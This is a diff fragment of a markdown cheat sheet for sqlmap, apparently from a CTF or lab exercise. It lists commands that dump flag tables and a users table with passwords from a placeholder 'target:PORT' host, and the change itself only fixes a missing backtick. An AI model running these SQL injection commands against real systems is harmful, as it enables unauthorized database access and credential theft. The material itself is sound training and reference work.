@@ -237,4 +237,4 @@ python sqlmap.py
 | `sqlmap -u "http://target:PORT/test.php?id=1" -D testdb -T flag5 --dump --no-cast --fresh-queries` | Fresh Queries ensured clean binary data. |
 | `sqlmap -u "http://target:PORT/test.php?col=id" --prefix='(look up prefixes)' --level=5 --risk=3 -D testdb -T flag6 --dump --no-cast` | Use Prefix with column usage to escape wrapped context. |
 | `sqlmap -u "http://target:PORT/case7.php?id=1" --union-cols=5 --no-cast -D testdb -T flag7 --dump` | Specify # of collumns for UNION SQLi. |
-| `sqlmap -u "http://target:PORT/case1.php?id=1" -D testdb -T users -C id,name,password --dump | Grab User Table/Crack Passwords (Use Wordlist and Select No for Slow Option)
+| `sqlmap -u "http://target:PORT/case1.php?id=1" -D testdb -T users -C id,name,password --dump` | Grab User Table/Crack Passwords (Use Wordlist and Select No for Slow Option)
